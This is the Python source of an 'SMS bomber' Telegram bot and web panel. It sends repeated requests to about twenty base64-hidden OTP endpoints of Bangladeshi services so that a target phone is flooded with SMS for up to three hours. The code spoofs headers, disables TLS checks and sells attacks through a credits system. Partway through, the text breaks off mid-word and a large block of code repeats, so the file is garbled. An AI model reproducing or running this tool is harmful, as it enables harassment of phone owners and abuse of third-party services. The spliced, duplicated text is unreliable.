#!/usr/bin/env python3
# ============================================================
#  MZ MINHAZ - SMS BOMBER (Premium UI + Hidden Admin Panel)
#  Developer: MZ MINHAZ
#  Admin: 8255204869
#  Channel: https://t.me/mz_creations_official
# ============================================================

import base64
import sys
import os
import time
import json
import ssl
import asyncio
import threading
import sqlite3
import aiohttp
import re
import uuid
import hmac
import hashlib
import socket
import subprocess
import urllib.request
import random
from urllib.parse import parse_qsl
from flask import Flask, request, jsonify, render_template_string
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    WebAppInfo, MenuButtonWebApp
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
)
from telegram.constants import ParseMode

# ============ CONFIG ============
BOT_TOKEN          = os.environ.get("BOT_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
ADMIN_ID           = int(os.environ.get("ADMIN_ID", 8255204869))
CHANNEL_URL        = "https://t.me/mz_creations_official"
CHANNEL_USERNAME   = "@mz_creations_official"
WELCOME_CREDITS    = 2
REF_CREDITS        = 5
BOMB_DURATION_SEC  = 3 * 60 * 60
DB_FILE            = os.environ.get("DB_FILE", "mzminhaz.db")
DEVELOPER_NAME     = "MZ MINHAZ"
WEBAPP_URL         = os.environ.get("WEBAPP_URL", "")

# ============ SSL ============
_ssl = ssl.create_default_context()
_ssl.check_hostname = False
_ssl.verify_mode = ssl.CERT_NONE

# ============ UTILITY ============
def bd(s):
    return base64.b64decode(s).decode()

def fmtnum(p):
    c = ''.join(filter(str.isdigit, p))
    if c.startswith('880'):   c = c[3:]
    elif c.startswith('88'):  c = c[2:]
    elif c.startswith('0'):   c = c[1:]
    return {
        'c': c, 'z': f"0{c}",
        'e8': f"88{c}", 'e88': f"88{c}",
        'e80': f"880{c}", 'e880': f"880{c}",
        'p8': f"+88{c}", 'p80': f"+880{c}", 'p880': f"+880{c}",
        '10': c[-10:] if len(c) >= 10 else c
    }

def verify_telegram_init_data(init_data, bot_token):
    try:
        parsed = dict(parse_qsl(init_data))
        hash_val = parsed.pop('hash', None)
        if not hash_val:
            return None
        data_check_string = '\n'.join(f"{k}={v}" for k, v in sorted(parsed.items()))
        secret_key = hmac.new(b"WebAppData", bot_token.encode(), hashlib.sha256).digest()
        computed_hash = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256).hexdigest()
        if computed_hash == hash_val:
            return json.loads(parsed.get('user', '{}'))
    except Exception:
        pass
    return None

def get_free_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port

def wait_for_server(port, timeout=15):
    url = f"http://127.0.0.1:{port}/"
    start = time.time()
    while time.time() - start < timeout:
        try:
            with urllib.request.urlopen(url, timeout=2) as r:
                if r.status == 200:
                    return True
        except Exception:
            pass
        time.sleep(0.5)
    return False

def start_cloudflare_tunnel(port):
    print(f"[tunnel] Starting Cloudflare tunnel for port {port}...")
    try:
        process = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--no-autoupdate"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
        )
    except FileNotFoundError:
        print("\n" + "="*50)
        print("❌ ERROR: 'cloudflared' is not installed.")
        print("Termux: pkg install cloudflared | Linux: apt install cloudflared")
        print("="*50 + "\n")
        sys.exit(1)

    url_pattern = re.compile(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com')
    for line in iter(process.stdout.readline, ''):
        match = url_pattern.search(line)
        if match:
            url = match.group(0)
            print(f"[tunnel] ✅ Successfully created tunnel: {url}")
            return url, process
    print("[ERROR] Failed to get Cloudflare tunnel URL.")
    process.terminate()
    sys.exit(1)

# ============ USER AGENTS ============
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0"
]

# ============ API LIST ============
APIS = [
    ["GP WebLogin", "aHR0cHM6Ly93ZWJsb2dpbmRhLmdyYW1lZW5waG9uZS5jb20vYmFja2VuZC9hcGkvdjEvb3Rw", {"msisdn": "z"}],
    ["GP FWA", "aHR0cHM6Ly9ncGZpLWFwaS5ncmFtZWVucGhvbmUuY29tL2FwaS92MS9md2EvcmVxdWVzdC1mb3Itb3Rw", {"phone": "z", "email": "", "language": "en"}],
    ["Bioscope Plus", "aHR0cHM6Ly9hcGktZHluYW1pYy5iaW9zY29wZWxpdmUuY29tL3YyL2F1dGgvbG9naW4/Y291bnRyeT1CRCZwbGF0Zm9ybT13ZWImbGFuZ3VhZ2U9ZW4=", {"number": "p80"}],
    ["Deepto Play", "aHR0cHM6Ly9hcGkuZGVlcHRvcGxheS5jb20vdjIvYXV0aC9sb2dpbj9jb3VudHJ5PUJEJnBsYXRmb3JtPXdlYiZsYW5ndWFnZT1lbg==", {"number": "p80"}],
    ["Amarbay", "aHR0cHM6Ly9iYWNrZW5kLmFtYXJiYXkuY29tL3VzZXIvZmluZF91c2VyX2J5X3Bob25lLw==", {"phone_number": "z"}],
    ["Wafilife", "aHR0cHM6Ly93d3cud2FmaWxpZmUuY29tL2FwaS9hdXRoL3NlbmQtb3Rw", {"mobileNumber": "z"}],
    ["Arogga", "aHR0cHM6Ly9hcGkuYXJvZ2dhLmNvbS9hdXRoL3YxL3Ntcy9zZW5kLz9mPXdlYiZiPUNocm9tZSZ2PTE0MS4wLjAuMCZvcz1XaW5kb3dzJm9zdj0xMA==", {"mobile": "z", "fcmToken": "", "referral": ""}],
    ["Osudpotro", "aHR0cHM6Ly9hcGkub3N1ZHBvdHJvLmNvbS9hcGkvdjEvdXNlcnMvc2VuZF9vdHA=", {"mobile": "p8", "deviceToken": "web", "language": "en", "os": "web"}],
    ["Pathao", "aHR0cHM6Ly9mb29kd2ViYXBpLnBhdGhhby5jb20vYXV0aC9nZXQtb3Rw", {"country_prefix": "880", "national_number": "10", "country_id": 1, "client_id": "2687095231"}],
    ["Paperfly", "aHR0cHM6Ly9nby1hcHAucGFwZXJmbHkuY29tLmJkL21lcmNoYW50L2FwaS9yZWFjdC9yZWdpc3RyYXRpb24vcmVxdWVzdF9yZWdpc3RyYXRpb24ucGhw", {"full_name": "SX", "company_name": "SX", "email_address": "sx@sx.com", "phone_number": "z"}],
    ["Ostad App", "aHR0cHM6Ly9hcGkub3N0YWQuYXBwL2FwaS92Mi91c2VyL3dpdGgtb3Rw", {"msisdn": "z"}],
    ["Mojaru", "aHR0cHM6Ly9uZXcubW9qYXJ1LmNvbS9hcGkvc3R1ZGVudC9yZWdpc3RyYXRpb24=", {"mobile_or_email": "z"}],
    ["Fundesh", "aHR0cHM6Ly9mdW5kZXNoLmNvbS5iZC9hcGkvYXV0aC9nZW5lcmF0ZU9UUD9zZXJ2aWNlX2tleT0=", {"msisdn": "z"}],
    ["Apex4U", "aHR0cHM6Ly9hcGkuYXBleDR1LmNvbS9hcGkvYXV0aC9sb2dpbg==", {"phoneNumber": "z"}],
    ["Choice Legacy", "aHR0cHM6Ly9jaG9pY2VsZWdhY3kuY29tLmJkL2FwcHMvY2hvaWNlLWxlZ2FjeS1wcm9kL2N1c3RvbWVyL2FjY291bnQvc2VuZC1vdHA=", {"phone": "p80", "register": True}],
    ["Kirei BD", "aHR0cHM6Ly9mcm9udGVuZGFwaS5raXJlaWJkLmNvbS9hcGkvdjIvc2VuZC1sb2dpbi1vdHA=", {"email": "z"}],
    ["Shikho", "aHR0cHM6Ly9hcGkuc2hpa2hvLmNvbS9hdXRoL3YyL3NlbmQvc21z", {"phone": "e80", "type": "student", "auth_type": "signup", "vendor": "shikho"}],
    ["Bohubrihi", "aHR0cHM6Ly9iYi1hcGkuYm9odWJyaWhpLmNvbS9wdWJsaWMvYWN0aXZpdHkvb3Rw", {"phone": "z", "intent": "login"}],
    ["Swap BD", "aHR0cHM6Ly9hcGkuc3dhcC5jb20uYmQvYXBpL3YxL3NlbmQtb3RwL3Yy", {"phone": "z"}],
    ["Priyoshikkhaloy", "aHR0cHM6Ly9hcHAucHJpeW9zaGlra2hhbG95LmNvbS9hcGkvdXNlci9yZWdpc3Rlci1sb2dpbi5waHA=", {"mobile": "z"}]
]

# ============ DATABASE ============
db_lock = threading.Lock()

def db_init():
    with db_lock:
        con = sqlite3.connect(DB_FILE, timeout=15)
        cur = con.cursor()
        cur.executescript("""
            CREATE TABLE IF NOT EXISTS users (
                chat_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
                credits INTEGER DEFAULT 0, ref_by INTEGER DEFAULT 0,
                referred_once INTEGER DEFAULT 0, banned INTEGER DEFAULT 0,
                joined_at INTEGER, total_attacks INTEGER DEFAULT 0
            );
        """)
        con.commit()
        con.close()

def db_query(sql, params=(), fetch=False):
    with db_lock:
        con = sqlite3.connect(DB_FILE, timeout=15)
        try:
            cur = con.cursor()
            cur.execute(sql, params)
            res = cur.fetchall() if fetch else None
            con.commit()
            return res
        finally:
            con.close()

def user_get(chat_id):
    rows = db_query("SELECT chat_id, credits, ref_by, banned, referred_once, total_attacks FROM users WHERE chat_id=?", (chat_id,), fetch=True)
    return rows[0] if rows else None

def user_exists(chat_id):
    return bool(db_query("SELECT 1 FROM users WHERE chat_id=?", (chat_id,), fetch=True))

def user_create(chat_id, username, first_name, ref_by=0):
    db_query(
        "INSERT OR IGNORE INTO users (chat_id, username, first_name, credits, ref_by, joined_at) VALUES (?,?,?,?,?,?)",
        (chat_id, username or "", first_name or "", WELCOME_CREDITS, ref_by, int(time.time()))
    )

def credits_add(chat_id, n):
    db_query("UPDATE users SET credits = credits + ? WHERE chat_id=?", (n, chat_id))

def credits_take(chat_id, n):
    with db_lock:
        con = sqlite3.connect(DB_FILE, timeout=15)
        try:
            cur = con.cursor()
            cur.execute("SELECT credits FROM users WHERE chat_id=?", (chat_id,))
            row = cur.fetchone()
            if not row or row[0] < n:
                return False
            cur.execute("UPDATE users SET credits = credits - ? WHERE chat_id=?", (n, chat_id))
            con.commit()
            return True
        finally:
            con.close()

# ============ ATTACK CORE ============
bot_attacks = {}
bot_attack_lock = threading.Lock()

def _render_payload(payload, pd):
    out = {}
    for k, v in payload.items():
        if isinstance(v, str) and v in pd:
            out[k] = pd[v]
        else:
            out[k] = v
    return out

async def _hit(session, api, pd, key, state_dict, lock):
    with lock:
        st = state_dict.get(key)
        if not st or st.get('stop_flag'): return

    ok = False
    try:
        url = bd(api[1])
        data = _render_payload(api[2], pd)
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Accept-Language": "en-US,en;q=0.9,bn;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "x-requested-with": "mark.via.gp",
            "Origin": "https://www.google.com",
            "Referer": "https://www.google.com/"
        }
        if not data:
            async with session.get(url, headers=headers, ssl=_ssl, timeout=7) as r:
                ok = r.status in (200, 201, 202, 204, 302)
        else:
            async with session.post(url, headers=headers, json=data, ssl=_ssl, timeout=7) as r:
                ok = r.status in (200, 201, 202, 204, 302)
    except:
        ok = False
    finally:
        with lock:
            st = state_dict.get(key)
            if st:
                st['total'] += 1
                if ok: st['ok'] += 1
                else:  st['fail'] += 1

async def _cycle(session, pd, key, state_dict, lock):
    tasks = []
    for api in APIS:
        with lock:
            st = state_dict.get(key)
            if not st or st.get('stop_flag'): break
        tasks.append(_hit(session, api, pd, key, state_dict, lock))
    if tasks:
        for i in range(0, len(tasks), 3):
            batch = tasks[i:i+3]
            await asyncio.gather(*batch, return_exceptions=True)
            await asyncio.sleep(0.02)

async def _runner(phone, delay, key, state_dict, lock, end_time=None):
    pd = fmtnum(phone)
    timeout = aiohttp.ClientTimeout(total=10, connect=5)
    connector = aiohttp.TCPConnector(limit=2000, limit_per_host=500, ssl=_ssl, enable_cleanup_closed=True)
    try:
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            while True:
                with lock:
                    st = state_dict.get(key)
                    if not st or st.get('stop_flag'): break
                if end_time and time.time() >= end_time:
                    break
                await _cycle(session, pd, key, state_dict, lock)
                if delay > 0:
                    await asyncio.sleep(delay)
    finally:
        with lock:
            st = state_dict.get(key)
            if st: st['running'] = False

def _spawn(phone, speed, key, state_dict, lock, end_time=None):
    delay_map = {'fast': 0.0, 'medium': 0.15, 'slow': 0.4}
    delay = delay_map.get(speed, 0.15)
    def worker():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(_runner(phone, delay, key, state_dict, lock, end_time))
        finally:
            loop.close()
    threading.Thread(target=worker, daemon=True).start()

# ============ FLASK PANEL ============
app = Flask(__name__)

HTML_TEMPLATE = r"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#000000">
<title>MZ MINHAZ — Bomber</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  :root {
    --bg: #050608;
    --panel: rgba(8, 20, 10, 0.72);
    --border: rgba(0, 255, 65, 0.25);
    --green: #00ff41;
    --green-soft: #14a842;
    --cyan: #00ffd0;
    --red: #ff3b3b;
    --red-soft: #a82222;
    --yellow: #ffcc00;
    --text: #d8ffe0;
    --muted: #4a7a5a;
    --shadow: 0 20px 60px rgba(0, 255, 65, 0.12);
  }
  html, body {
    min-height: 100vh;
    background: var(--bg);
    color: var(--text);
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    overflow-x: hidden;
    overscroll-behavior: none;
  }
  #matrix {
    position: fixed; inset: 0;
    z-index: 0; pointer-events: none;
    opacity: 0.55;
  }
  .bg-glow {
    position: fixed; inset: 0; z-index: 0; pointer-events: none;
    background:
      radial-gradient(circle at 20% 10%, rgba(0,255,65,0.10) 0%, transparent 45%),
      radial-gradient(circle at 80% 90%, rgba(0,255,208,0.08) 0%, transparent 50%);
  }

  /* ====== LOADER ====== */
  #loader {
    position: fixed; inset: 0; z-index: 9999;
    display: flex; flex-direction: column; align-items: center; justify-content: center;
    background: var(--bg); gap: 24px;
    transition: opacity .5s ease;
  }
  #loader.hide { opacity: 0; pointer-events: none; }
  .spinner {
    width: 56px; height: 56px;
    border: 3px solid rgba(0,255,65,0.15);
    border-top-color: var(--green);
    border-radius: 50%;
    animation: spin 0.9s linear infinite;
    box-shadow: 0 0 30px rgba(0,255,65,0.3);
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .load-text {
    font-family: 'Courier New', monospace;
    color: var(--green);
    letter-spacing: 4px;
    font-size: 12px;
    font-weight: 700;
    animation: blink 1.4s infinite;
  }
  @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }

  /* ====== APP ====== */
  .app {
    position: relative; z-index: 2;
    max-width: 480px;
    margin: 0 auto;
    padding: 20px 18px 100px;
    min-height: 100vh;
    display: flex; flex-direction: column; gap: 18px;
  }

  /* ====== HEADER ====== */
  .top-bar {
    display: flex; justify-content: space-between; align-items: center;
  }
  .credits-pill {
    display: flex; align-items: center; gap: 8px;
    padding: 10px 16px;
    background: linear-gradient(135deg, rgba(0,255,65,0.15), rgba(0,255,208,0.08));
    border: 1px solid var(--border);
    border-radius: 100px;
    backdrop-filter: blur(20px);
    box-shadow: 0 8px 30px rgba(0,255,65,0.15);
  }
  .credits-pill .icon { font-size: 18px; }
  .credits-pill .val {
    font-family: 'Courier New', monospace;
    font-weight: 800;
    font-size: 18px;
    color: var(--green);
    text-shadow: 0 0 20px rgba(0,255,65,0.6);
    min-width: 20px;
    transition: transform .3s;
  }
  .credits-pill .val.bump { transform: scale(1.35); }
  .credits-pill .lbl {
    font-size: 10px;
    color: var(--muted);
    text-transform: uppercase;
    letter-spacing: 2px;
    font-weight: 700;
  }
  .close-btn {
    width: 42px; height: 42px;
    display: flex; align-items: center; justify-content: center;
    background: rgba(255,59,59,0.08);
    border: 1px solid rgba(255,59,59,0.3);
    border-radius: 50%;
    color: var(--red);
    font-size: 20px;
    cursor: pointer;
    transition: all .2s;
  }
  .close-btn:active { transform: scale(0.9); background: rgba(255,59,59,0.2); }

  /* ====== BRAND ====== */
  .brand { text-align: center; padding: 8px 0 6px; }
  .brand h1 {
    font-family: 'Courier New', monospace;
    font-size: 34px;
    font-weight: 900;
    color: var(--green);
    letter-spacing: 4px;
    text-shadow:
      0 0 10px rgba(0,255,65,0.8),
      0 0 30px rgba(0,255,65,0.5),
      0 0 60px rgba(0,255,65,0.3);
    animation: glow 3s ease-in-out infinite;
  }
  @keyframes glow {
    0%,100% { text-shadow: 0 0 10px rgba(0,255,65,0.8), 0 0 30px rgba(0,255,65,0.5), 0 0 60px rgba(0,255,65,0.3); }
    50% { text-shadow: 0 0 20px rgba(0,255,65,1), 0 0 50px rgba(0,255,65,0.7), 0 0 90px rgba(0,255,65,0.5); }
  }
  .brand .tagline {
    font-size: 11px;
    letter-spacing: 5px;
    color: var(--muted);
    text-transform: uppercase;
    margin-top: 6px;
    font-weight: 600;
  }
  .brand .divider {
    height: 1px; width: 60px; margin: 14px auto 0;
    background: linear-gradient(90deg, transparent, var(--green), transparent);
    box-shadow: 0 0 15px var(--green);
  }

  /* ====== CARD ====== */
  .card {
    background: var(--panel);
    backdrop-filter: blur(24px);
    -webkit-backdrop-filter: blur(24px);
    border: 1px solid var(--border);
    border-radius: 24px;
    padding: 22px 20px;
    box-shadow: var(--shadow), inset 0 1px 0 rgba(255,255,255,0.03);
    position: relative;
    overflow: hidden;
  }
  .card::before {
    content: '';
    position: absolute; top: 0; left: -100%;
    width: 100%; height: 100%;
    background: linear-gradient(90deg, transparent, rgba(0,255,65,0.05), transparent);
    animation: shine 8s infinite;
  }
  @keyframes shine {
    0% { left: -100%; }
    50%,100% { left: 100%; }
  }

  .label {
    display: flex; align-items: center; gap: 8px;
    font-size: 11px;
    color: var(--muted);
    text-transform: uppercase;
    letter-spacing: 2px;
    font-weight: 700;
    margin-bottom: 12px;
  }
  .label .ico { font-size: 15px; filter: drop-shadow(0 0 6px rgba(0,255,65,0.5)); }

  /* ====== PHONE INPUT ====== */
  .phone-wrap {
    position: relative;
    display: flex; align-items: center;
    background: rgba(0, 20, 5, 0.7);
    border: 1.5px solid rgba(0,255,65,0.3);
    border-radius: 16px;
    padding: 4px 6px;
    transition: all .25s;
  }
  .phone-wrap:focus-within {
    border-color: var(--green);
    box-shadow: 0 0 0 3px rgba(0,255,65,0.12), 0 0 30px rgba(0,255,65,0.25);
  }
  .phone-prefix {
    padding: 12px 14px;
    color: var(--green);
    font-family: 'Courier New', monospace;
    font-weight: 800;
    font-size: 16px;
    border-right: 1px solid rgba(0,255,65,0.2);
    margin-right: 4px;
  }
  #phone {
    flex: 1;
    background: transparent;
    border: none;
    outline: none;
    color: var(--text);
    font-family: 'Courier New', monospace;
    font-size: 17px;
    font-weight: 700;
    letter-spacing: 2px;
    padding: 12px 8px;
    width: 100%;
  }
  #phone::placeholder { color: var(--muted); letter-spacr k, v in payload.items():
        if isinstance(v, str) and v in pd:
            out[k] = pd[v]
        else:
            out[k] = v
    return out

async def _hit(session, api, pd, key, state_dict, lock):
    with lock:
        st = state_dict.get(key)
        if not st or st.get('stop_flag'): return

    ok = False
    try:
        url = bd(api[1])
        data = _render_payload(api[2], pd)
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Accept-Language": "en-US,en;q=0.9,bn;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "x-requested-with": "mark.via.gp",
            "Origin": "https://www.google.com",
            "Referer": "https://www.google.com/"
        }
        if not data:
            async with session.get(url, headers=headers, ssl=_ssl, timeout=7) as r:
                ok = r.status in (200, 201, 202, 204, 302)
        else:
            async with session.post(url, headers=headers, json=data, ssl=_ssl, timeout=7) as r:
                ok = r.status in (200, 201, 202, 204, 302)
    except:
        ok = False
    finally:
        with lock:
            st = state_dict.get(key)
            if st:
                st['total'] += 1
                if ok: st['ok'] += 1
                else:  st['fail'] += 1

async def _cycle(session, pd, key, state_dict, lock):
    tasks = []
    for api in APIS:
        with lock:
            st = state_dict.get(key)
            if not st or st.get('stop_flag'): break
        tasks.append(_hit(session, api, pd, key, state_dict, lock))
    if tasks:
        for i in range(0, len(tasks), 3):
            batch = tasks[i:i+3]
            await asyncio.gather(*batch, return_exceptions=True)
            await asyncio.sleep(0.02)

async def _runner(phone, delay, key, state_dict, lock, end_time=None):
    pd = fmtnum(phone)
    timeout = aiohttp.ClientTimeout(total=10, connect=5)
    connector = aiohttp.TCPConnector(limit=2000, limit_per_host=500, ssl=_ssl, enable_cleanup_closed=True)
    try:
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            while True:
                with lock:
                    st = state_dict.get(key)
                    if not st or st.get('stop_flag'): break
                if end_time and time.time() >= end_time:
                    break
                await _cycle(session, pd, key, state_dict, lock)
                if delay > 0:
                    await asyncio.sleep(delay)
    finally:
        with lock:
            st = state_dict.get(key)
            if st: st['running'] = False

def _spawn(phone, speed, key, state_dict, lock, end_time=None):
    delay_map = {'fast': 0.0, 'medium': 0.15, 'slow': 0.4}
    delay = delay_map.get(speed, 0.15)
    def worker():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(_runner(phone, delay, key, state_dict, lock, end_time))
        finally:
            loop.close()
    threading.Thread(target=worker, daemon=True).start()

# ============ FLASK PANEL ============
app = Flask(__name__)

HTML_TEMPLATE = r"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#000000">
<title>MZ MINHAZ — Bomber</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  :root {
    --bg: #050608;
    --panel: rgba(8, 20, 10, 0.72);
    --border: rgba(0, 255, 65, 0.25);
    --green: #00ff41;
    --green-soft: #14a842;
    --cyan: #00ffd0;
    --red: #ff3b3b;
    --red-soft: #a82222;
    --yellow: #ffcc00;
    --text: #d8ffe0;
    --muted: #4a7a5a;
    --shadow: 0 20px 60px rgba(0, 255, 65, 0.12);
  }
  html, body {
    min-height: 100vh;
    background: var(--bg);
    color: var(--text);
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    overflow-x: hidden;
    overscroll-behavior: none;
  }
  #matrix {
    position: fixed; inset: 0;
    z-index: 0; pointer-events: none;
    opacity: 0.55;
  }
  .bg-glow {
    position: fixed; inset: 0; z-index: 0; pointer-events: none;
    background:
      radial-gradient(circle at 20% 10%, rgba(0,255,65,0.10) 0%, transparent 45%),
      radial-gradient(circle at 80% 90%, rgba(0,255,208,0.08) 0%, transparent 50%);
  }

  /* ====== LOADER ====== */
  #loader {
    position: fixed; inset: 0; z-index: 9999;
    display: flex; flex-direction: column; align-items: center; justify-content: center;
    background: var(--bg); gap: 24px;
    transition: opacity .5s ease;
  }
  #loader.hide { opacity: 0; pointer-events: none; }
  .spinner {
    width: 56px; height: 56px;
    border: 3px solid rgba(0,255,65,0.15);
    border-top-color: var(--green);
    border-radius: 50%;
    animation: spin 0.9s linear infinite;
    box-shadow: 0 0 30px rgba(0,255,65,0.3);
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .load-text {
    font-family: 'Courier New', monospace;
    color: var(--green);
    letter-spacing: 4px;
    font-size: 12px;
    font-weight: 700;
    animation: blink 1.4s infinite;
  }
  @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }

  /* ====== APP ====== */
  .app {
    position: relative; z-index: 2;
    max-width: 480px;
    margin: 0 auto;
    padding: 20px 18px 100px;
    min-height: 100vh;
    display: flex; flex-direction: column; gap: 18px;
  }

  /* ====== HEADER ====== */
  .top-bar {
    display: flex; justify-content: space-between; align-items: center;
  }
  .credits-pill {
    display: flex; align-items: center; gap: 8px;
    padding: 10px 16px;
    background: linear-gradient(135deg, rgba(0,255,65,0.15), rgba(0,255,208,0.08));
    border: 1px solid var(--border);
    border-radius: 100px;
    backdrop-filter: blur(20px);
    box-shadow: 0 8px 30px rgba(0,255,65,0.15);
  }
  .credits-pill .icon { font-size: 18px; }
  .credits-pill .val {
    font-family: 'Courier New', monospace;
    font-weight: 800;
    font-size: 18px;
    color: var(--green);
    text-shadow: 0 0 20px rgba(0,255,65,0.6);
    min-width: 20px;
    transition: transform .3s;
  }
  .credits-pill .val.bump { transform: scale(1.35); }
  .credits-pill .lbl {
    font-size: 10px;
    color: var(--muted);
    text-transform: uppercase;
    letter-spacing: 2px;
    font-weight: 700;
  }
  .close-btn {
    width: 42px; height: 42px;
    display: flex; align-items: center; justify-content: center;
    background: rgba(255,59,59,0.08);
    border: 1px solid rgba(255,59,59,0.3);
    border-radius: 50%;
    color: var(--red);
    font-size: 20px;
    cursor: pointer;
    transition: all .2s;
  }
  .close-btn:active { transform: scale(0.9); background: rgba(255,59,59,0.2); }

  /* ====== BRAND ====== */
  .brand { text-align: center; padding: 8px 0 6px; }
  .brand h1 {
    font-family: 'Courier New', monospace;
    font-size: 34px;
    font-weight: 900;
    color: var(--green);
    letter-spacing: 4px;
    text-shadow:
      0 0 10px rgba(0,255,65,0.8),
      0 0 30px rgba(0,255,65,0.5),
      0 0 60px rgba(0,255,65,0.3);
    animation: glow 3s ease-in-out infinite;
  }
  @keyframes glow {
    0%,100% { text-shadow: 0 0 10px rgba(0,255,65,0.8), 0 0 30px rgba(0,255,65,0.5), 0 0 60px rgba(0,255,65,0.3); }
    50% { text-shadow: 0 0 20px rgba(0,255,65,1), 0 0 50px rgba(0,255,65,0.7), 0 0 90px rgba(0,255,65,0.5); }
  }
  .brand .tagline {
    font-size: 11px;
    letter-spacing: 5px;
    color: var(--muted);
    text-transform: uppercase;
    margin-top: 6px;
    font-weight: 600;
  }
  .brand .divider {
    height: 1px; width: 60px; margin: 14px auto 0;
    background: linear-gradient(90deg, transparent, var(--green), transparent);
    box-shadow: 0 0 15px var(--green);
  }

  /* ====== CARD ====== */
  .card {
    background: var(--panel);
    backdrop-filter: blur(24px);
    -webkit-backdrop-filter: blur(24px);
    border: 1px solid var(--border);
    border-radius: 24px;
    padding: 22px 20px;
    box-shadow: var(--shadow), inset 0 1px 0 rgba(255,255,255,0.03);
    position: relative;
    overflow: hidden;
  }
  .card::before {
    content: '';
    position: absolute; top: 0; left: -100%;
    width: 100%; height: 100%;
    background: linear-gradient(90deg, transparent, rgba(0,255,65,0.05), transparent);
    animation: shine 8s infinite;
  }
  @keyframes shine {
    0% { left: -100%; }
    50%,100% { left: 100%; }
  }

  .label {
    display: flex; align-items: center; gap: 8px;
    font-size: 11px;
    color: var(--muted);
    text-transform: uppercase;
    letter-spacing: 2px;
    font-weight: 700;
    margin-bottom: 12px;
  }
  .label .ico { font-size: 15px; filter: drop-shadow(0 0 6px rgba(0,255,65,0.5)); }

  /* ====== PHONE INPUT ====== */
  .phone-wrap {
    position: relative;
    display: flex; align-items: center;
    background: rgba(0, 20, 5, 0.7);
    border: 1.5px solid rgba(0,255,65,0.3);
    border-radius: 16px;
    padding: 4px 6px;
    transition: all .25s;
  }
  .phone-wrap:focus-within {
    border-color: var(--green);
    box-shadow: 0 0 0 3px rgba(0,255,65,0.12), 0 0 30px rgba(0,255,65,0.25);
  }
  .phone-prefix {
    padding: 12px 14px;
    color: var(--green);
    font-family: 'Courier New', monospace;
    font-weight: 800;
    font-size: 16px;
    border-right: 1px solid rgba(0,255,65,0.2);
    margin-right: 4px;
  }
  #phone {
    flex: 1;
    background: transparent;
    border: none;
    outline: none;
    color: var(--text);
    font-family: 'Courier New', monospace;
    font-size: 17px;
    font-weight: 700;
    letter-spacing: 2px;
    padding: 12px 8px;
    width: 100%;
  }
  #phone::placeholder { color: var(--muted); letter-spacing: 1px; font-weight: 400; }

  /* ====== SPEED PILLS ====== */
  .speed-pills {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 8px;
  }
  .speed-pill {
    display: flex; flex-direction: column; align-items: center; gap: 4px;
    padding: 12px 6px;
    background: rgba(0, 20, 5, 0.6);
    border: 1.5px solid rgba(0,255,65,0.2);
    border-radius: 14px;
    cursor: pointer;
    transition: all .25s;
    font-family: 'Courier New', monospace;
  }
  .speed-pill .emoji { font-size: 20px; transition: transform .3s; }
  .speed-pill .name {
    font-size: 11px;
    font-weight: 800;
    color: var(--muted);
    letter-spacing: 1px;
    text-transform: uppercase;
    transition: color .25s;
  }
  .speed-pill .time {
    font-size: 9px;
    color: rgba(74,122,90,0.6);
    letter-spacing: 0.5px;
  }
  .speed-pill.active {
    background: linear-gradient(135deg, rgba(0,255,65,0.2), rgba(0,255,208,0.1));
    border-color: var(--green);
    box-shadow: 0 0 20px rgba(0,255,65,0.3);
  }
